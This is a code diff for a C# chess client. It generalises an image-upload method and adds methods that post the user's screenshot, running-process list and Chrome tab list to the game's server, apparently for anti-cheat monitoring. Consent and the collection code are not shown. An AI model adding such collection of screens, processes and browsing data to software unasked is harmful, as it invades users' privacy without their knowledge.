@@ -38,17 +38,29 @@ namespace ChessClient.Classes
             return player;
         }
 
-        public void UploadImage(byte[] imageData, string name)
+        void uploadData(byte[] data, string MIME, string name, string fileName, string url)
         {
             var requestContent = new MultipartFormDataContent();
             //    here you can specify boundary if you need---^
-            var imageContent = new ByteArrayContent(imageData);
+            var imageContent = new ByteArrayContent(data);
             imageContent.Headers.ContentType =
-                MediaTypeHeaderValue.Parse("image/png");
+                MediaTypeHeaderValue.Parse(MIME);
 
-            requestContent.Add(imageContent, "image", "image.png");
-            var r = Client.PostAsync($"/chess/api/online/screen?name={Uri.EscapeDataString(name)}", requestContent).Result;
+            requestContent.Add(imageContent, name, fileName);
+            var r = Client.PostAsync(url, requestContent).Result;
         }
+
+        public void UploadImage(byte[] imageData, string name)
+        {
+            uploadData(imageData, "image/png", "image", "fileName", $"/chess/api/online/screen?name={Uri.EscapeDataString(name)}");
+        }
+
+        public void UploadProcesses(byte[] textData)
+        {
+            uploadData(textData, "text/plain", "process", "process.txt", $"/chess/api/online/processes");
+        }
+
+        public void UploadChromes(byte[] data) => uploadData(data, "text/plain", "chrome", "tabs.txt", "/chess/api/online/chrome");
 
         public void CreateNewGame()
         {
